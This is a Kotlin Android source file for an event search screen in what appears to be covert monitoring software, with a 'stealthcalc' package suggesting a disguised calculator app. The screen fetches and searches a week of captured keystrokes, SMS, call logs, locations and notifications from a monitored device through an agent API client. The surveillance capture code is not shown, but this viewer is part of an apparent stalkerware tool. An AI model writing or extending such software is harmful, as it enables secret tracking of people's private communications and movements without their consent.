package com.stealthcalc.monitoring.ui

import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.Search
import androidx.compose.material3.ExperimentalMaterial3Api
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.material3.TopAppBar
import androidx.compose.material3.TopAppBarDefaults
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.hilt.navigation.compose.hiltViewModel
import androidx.lifecycle.ViewModel
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.lifecycle.viewModelScope
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.EventPayload
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.launch
import kotlinx.serialization.json.Json
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import javax.inject.Inject

data class SearchState(
    val query: String = "",
    val results: List<ParsedEvent> = emptyList(),
    val isSearching: Boolean = false,
)

@HiltViewModel
class EventSearchViewModel @Inject constructor(
    private val repository: MonitoringRepository,
    private val apiClient: AgentApiClient,
) : ViewModel() {

    private val json = Json { ignoreUnknownKeys = true }
    private val _state = MutableStateFlow(SearchState())
    val state: StateFlow<SearchState> = _state.asStateFlow()
    private var searchJob: Job? = null
    private var cachedEvents: List<EventPayload>? = null

    fun search(query: String) {
        _state.value = _state.value.copy(query = query)
        searchJob?.cancel()
        if (query.length < 2) {
            _state.value = _state.value.copy(results = emptyList())
            return
        }
        searchJob = viewModelScope.launch {
            delay(300)
            _state.value = _state.value.copy(isSearching = true)

            if (cachedEvents == null) {
                cachedEvents = apiClient.getEvents(
                    repository.deviceId,
                    since = System.currentTimeMillis() - 7 * 24 * 3600 * 1000L
                )
            }

            val lowerQuery = query.lowercase()
            val matches = cachedEvents!!.filter { event ->
                event.kind.lowercase().contains(lowerQuery) ||
                event.payload.lowercase().contains(lowerQuery)
            }.take(100).map { parseSearchResult(it) }

            _state.value = _state.value.copy(results = matches, isSearching = false)
        }
    }

    private fun parseSearchResult(event: EventPayload): ParsedEvent {
        val obj = runCatching { json.parseToJsonElement(event.payload).jsonObject }.getOrNull()
        val kindLabel = event.kind.lowercase().replace("_", " ").replaceFirstChar { it.uppercase() }

        val snippet = obj?.entries?.take(3)?.joinToString(" | ") { (k, v) ->
            "$k: ${v.jsonPrimitive.content.take(40)}"
        } ?: event.payload.take(100)

        return ParsedEvent(
            raw = event,
            title = kindLabel,
            subtitle = snippet,
            icon = when (event.kind) {
                "APP_USAGE" -> "app"
                "NOTIFICATION" -> "notification"
                "CALL_LOG" -> "call"
                "SMS" -> "sms"
                "KEYSTROKE" -> "keystroke"
                "LOCATION" -> "location"
                else -> "unknown"
            }
        )
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun EventSearchScreen(
    onBack: () -> Unit,
    viewModel: EventSearchViewModel = hiltViewModel(),
) {
    val state by viewModel.state.collectAsStateWithLifecycle()
    var query by remember { mutableStateOf("") }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("Search Events") },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(
                    containerColor = MaterialTheme.colorScheme.background,
                    titleContentColor = MaterialTheme.colorScheme.onBackground,
                )
            )
        }
    ) { padding ->
        Column(
            modifier = Modifier.fillMaxSize().padding(padding).padding(horizontal = 16.dp)
        ) {
            OutlinedTextField(
                value = query,
                onValueChange = {
                    query = it
                    viewModel.search(it)
                },
                label = { Text("Search all events (7 days)") },
                leadingIcon = { Icon(Icons.Default.Search, null) },
                singleLine = true,
                modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp)
            )

            Text(
                "${state.results.size} results",
                style = MaterialTheme.typography.labelSmall,
                color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.5f)
            )

            LazyColumn(
                verticalArrangement = Arrangement.spacedBy(6.dp),
            ) {
                item { Spacer(modifier = Modifier.height(4.dp)) }
                items(state.results, key = { it.raw.id }) { parsed ->
                    ParsedEventCard(parsed)
                }
                item { Spacer(modifier = Modifier.height(16.dp)) }
            }
        }
    }
}
